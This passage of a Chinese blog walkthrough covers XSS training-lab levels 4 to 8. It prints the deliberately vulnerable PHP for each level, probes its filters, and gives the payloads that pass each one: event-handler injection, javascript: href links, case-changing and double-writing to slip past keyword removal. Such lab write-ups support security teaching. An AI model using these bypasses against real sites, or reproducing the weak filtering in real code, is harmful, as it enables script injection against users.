+            srcset="https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg, https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg 1.5x, https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c87b6f1ddac507cc53adb8.jpg">
+    </a></figure></p>
+<h3 id="源码-3" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81-3" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = $_GET[&#34;keyword&#34;];
+</span></span><span class="line"><span class="cl">$str2=str_replace(&#34;&gt;&#34;,&#34;&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;&lt;&#34;,&#34;&#34;,$str2);
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h2 align=center&gt;没有找到和&#34;.htmlspecialchars($str).&#34;相关的结果.&lt;/h2&gt;&#34;.&#39;&lt;center&gt;
+</span></span><span class="line"><span class="cl">&lt;form action=level4.php method=GET&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=keyword  value=&#34;&#39;.$str3.&#39;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=submit name=submit value=搜索 /&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str3).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下-3" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b-3" class="header-mark"></a>过程(未知源码的情况下)</h3><p>表单输入<code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;</code>查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>欢迎来到level4<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>没有找到和<span class="ni">&amp;lt;</span>sCr<span class="ni">&amp;lt;</span>scrscRiptipt<span class="ni">&amp;gt;</span>ipt<span class="ni">&amp;gt;</span>OonN\<span class="ni">&amp;amp;</span>apos;\<span class="ni">&amp;quot;</span>&#39;<span class="ni">&amp;lt;&amp;gt;</span>相关的结果.<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">level4.php</span> <span class="na">method</span><span class="o">=</span><span class="s">GET</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">keyword</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;sCrscrscRiptiptiptOonN\&amp;apos;\&#34;</span><span class="err">&#39;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">搜索</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">level4.png</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h3</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>payload的长度:32<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有两处输出(第3行、第5行)，这两处的输出都被处理过，第3行的处理可能是用了<code>htmlspecialchars()</code>，虽然没处理<code>'</code>但也没法利用。第5行处理了<code>&lt;</code>和<code>&gt;</code>，将第5行的输出作为构造payload的基础。</p>
+<p><em><strong>表单输入<code>&quot;onmouseover=&quot;javascript:alert(1)</code>，鼠标移到表单上，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第五关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%ba%94%e5%85%b3" class="header-mark"></a>第五关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg" title="https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg"
+            srcset="https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg, https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg 1.5x, https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c880331ddac507cc5d4373.jpg">
+    </a></figure></p>
+<h3 id="源码-4" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81-4" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = strtolower($_GET[&#34;keyword&#34;]);
+</span></span><span class="line"><span class="cl">$str2=str_replace(&#34;&lt;script&#34;,&#34;&lt;scr_ipt&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;o_n&#34;,$str2);
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h2 align=center&gt;没有找到和&#34;.htmlspecialchars($str).&#34;相关的结果.&lt;/h2&gt;&#34;.&#39;&lt;center&gt;
+</span></span><span class="line"><span class="cl">&lt;form action=level5.php method=GET&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=keyword  value=&#34;&#39;.$str3.&#39;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=submit name=submit value=搜索 /&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str3).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下-4" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b-4" class="header-mark"></a>过程(未知源码的情况下)</h3><p>表单输入<code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;</code>查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>没有找到和<span class="ni">&amp;lt;</span>scr<span class="ni">&amp;lt;</span>scrscriptipt<span class="ni">&amp;gt;</span>ipt<span class="ni">&amp;gt;</span>oonn\<span class="ni">&amp;amp;</span>apos;\<span class="ni">&amp;quot;</span>&#39;<span class="ni">&amp;lt;&amp;gt;</span>相关的结果.<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">level5.php</span> <span class="na">method</span><span class="o">=</span><span class="s">GET</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">keyword</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;scr&lt;scrscriptipt&gt;ipt&gt;oo_nn\&amp;apos;\&#34;</span><span class="err">&#39;&lt;</span><span class="p">&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">搜索</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有两处输出(第1行、第3行)，这两处的输出都被处理过，推测第1行的处理用了<code>htmlspecialchars()</code>，第3行将<code>on</code>替换成<code>o_n</code>，将第5行的输出作为构造payload的基础。</p>
+<p>表单输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">keyword</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>推测不仅将<code>on</code>替换成<code>o_n</code>，还将<code>&lt;script&gt;</code>替换成<code>&lt;scr_ipt&gt;</code>。</p>
+<p><em><strong>构造 payload ——<code>&quot; &gt;&lt;a href = &quot;javascript:alert(1)&quot; &gt;click&lt;/a&gt;</code>，点击按钮，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第六关" class="headerLink">
+    <a href="#%e7%ac%ac%e5%85%ad%e5%85%b3" class="header-mark"></a>第六关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg" title="https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg"
+            srcset="https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg, https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg 1.5x, https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c88fd71ddac507cc773c36.jpg">
+    </a></figure></p>
+<h3 id="源码-5" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81-5" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = $_GET[&#34;keyword&#34;];
+</span></span><span class="line"><span class="cl">$str2=str_replace(&#34;&lt;script&#34;,&#34;&lt;scr_ipt&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;o_n&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;src&#34;,&#34;sr_c&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;data&#34;,&#34;da_ta&#34;,$str4);
+</span></span><span class="line"><span class="cl">$str6=str_replace(&#34;href&#34;,&#34;hr_ef&#34;,$str5);
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h2 align=center&gt;没有找到和&#34;.htmlspecialchars($str).&#34;相关的结果.&lt;/h2&gt;&#34;.&#39;&lt;center&gt;
+</span></span><span class="line"><span class="cl">&lt;form action=level6.php method=GET&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=keyword  value=&#34;&#39;.$str6.&#39;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=submit name=submit value=搜索 /&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str6).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下-5" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b-5" class="header-mark"></a>过程(未知源码的情况下)</h3><p>与上一关一样，推测不仅将<code>on</code>替换成<code>o_n</code>，还将<code>&lt;script&gt;</code>替换成<code>&lt;scr_ipt&gt;</code>。</p>
+<p>用上一关的payload——<code>&quot; &gt;&lt;a href = &quot;javascript:alert(1)&quot; &gt;click&lt;/a&gt;</code>，发现<code>href</code>也被处理成<code>hr_ef</code>。</p>
+<p><em><strong>尝试换成大写的<code>hREf</code>——<code>&quot; &gt;&lt;a hREf = &quot;javascript:alert(1)&quot; &gt;click&lt;/a&gt;</code>，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第七关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%83%e5%85%b3" class="header-mark"></a>第七关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg" title="https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg"
+            srcset="https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg, https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg 1.5x, https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c8927f1ddac507cc7c3a7a.jpg">
+    </a></figure></p>
+<h3 id="源码-6" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81-6" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str =strtolower( $_GET[&#34;keyword&#34;]);
+</span></span><span class="line"><span class="cl">$str2=str_replace(&#34;script&#34;,&#34;&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;src&#34;,&#34;&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;data&#34;,&#34;&#34;,$str4);
+</span></span><span class="line"><span class="cl">$str6=str_replace(&#34;href&#34;,&#34;&#34;,$str5);
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h2 align=center&gt;没有找到和&#34;.htmlspecialchars($str).&#34;相关的结果.&lt;/h2&gt;&#34;.&#39;&lt;center&gt;
+</span></span><span class="line"><span class="cl">&lt;form action=level7.php method=GET&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=keyword  value=&#34;&#39;.$str6.&#39;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=submit name=submit value=搜索 /&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str6).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下-6" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b-6" class="header-mark"></a>过程(未知源码的情况下)</h3><p>表单输入<code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;</code>查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">keyword</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;scr&lt;script&gt;ipt&gt;on\&amp;apos;\&#34;</span><span class="err">&#39;&lt;</span><span class="p">&gt;</span>&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>推测将<code>script</code>和<code>on</code>删了。</p>
+<p><em><strong>构造payload：<code>&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code>，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第八关" class="headerLink">
+    <a href="#%e7%ac%ac%e5%85%ab%e5%85%b3" class="header-mark"></a>第八关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg" title="https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg"
+            srcset="https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg, https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg 1.5x, https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c8948b1ddac507cc80558d.jpg">
+    </a></figure></p>
+<h3 id="源码-7" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81-7" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = strtolower($_GET[&#34;keyword&#34;]);
+</span></span><span class="line"><span class="cl">$str2=str_replace(&#34;script&#34;,&#34;scr_ipt&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;o_n&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;src&#34;,&#34;sr_c&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;data&#34;,&#34;da_ta&#34;,$str4);
+</span></span><span class="line"><span class="cl">$str6=str_replace(&#34;href&#34;,&#34;hr_ef&#34;,$str5);
+</span></span><span class="line"><span class="cl">$str7=str_replace(&#39;&#34;&#39;,&#39;&amp;quot&#39;,$str6);
+</span></span><span class="line"><span class="cl">echo &#39;&lt;center&gt;
+</span></span><span class="line"><span class="cl">&lt;form action=level8.php method=GET&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=keyword  value=&#34;&#39;.htmlspecialchars($str).&#39;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=submit name=submit value=添加友情链接 /&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl"> echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&#34;&#39;.$str7.&#39;&#34;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str7).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下-7" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b-7" class="header-mark"></a>过程(未知源码的情况下)</h3><p>表单输入<code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;</code>查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">keyword</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;&amp;lt;scr&amp;lt;scrscriptipt&amp;gt;ipt&amp;gt;oonn\&amp;amp;apos;\&amp;quot;&#39;&amp;lt;&amp;gt;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">添加友情链接</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
